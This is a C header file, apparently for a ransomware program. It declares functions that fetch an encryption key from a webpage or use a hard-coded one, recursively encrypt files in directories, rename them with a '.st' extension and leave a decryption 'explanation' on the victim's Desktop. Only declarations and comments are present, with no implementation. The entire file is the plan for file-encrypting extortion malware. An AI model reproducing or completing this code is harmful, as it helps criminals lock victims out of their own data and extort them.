#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>

#define MAX 1000000 // 1Mb
#define ENC_EXT ".st"
#define LEN_ENC_EXT 3
#define LENGTH 32

enum {
	EXIST,
	NO_EXIST
};

// get the key from the webpage
// or if not able to do it use the hard coded encrypted key
char* getKey();

// open the file in the right mode and check for errors
FILE* openFile(const char* path, const char* mode);
// close the input and output files
int closeFile(FILE*, FILE*);
// docrypt will read each char from input
// and use the function given in argument to encrypt each char
// will write de encrypted char in the output file
int docrypt(FILE* input, FILE* output, const char* key,int (*)(int, char[], const char*,int*));
// encrypt the char with the given key
int encrypt(int n, char[n], const char*, int*);
// decrypt the char with the given key
int decrypt(int n, char[n], const char*, int*);
// add the extension to the encrypted file
char* addext(const char* path, const char* ext);
// remove the extension from the file
char* remext(const char* input);

// take the path of a file and manage function to encrypt it
int processFile(char* path, const char* key);

/////////////////////

// check if the given path is a directory
int isDir(char* path);
// show the files in the directory recursively and encrypt them
int encDir(char* path, const char* key);
// add the full path to the file
char* addPath(const char* path, const char* file);

// print how to decrypt
// maybe write it in a file in the Desktop if possible
// or somewhere to be easily findable
void leaveExplanation();

// string to hex array
int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size);
// hex array to string
int hexa_to_bytes(char hex_string[], unsigned char val[], int size);
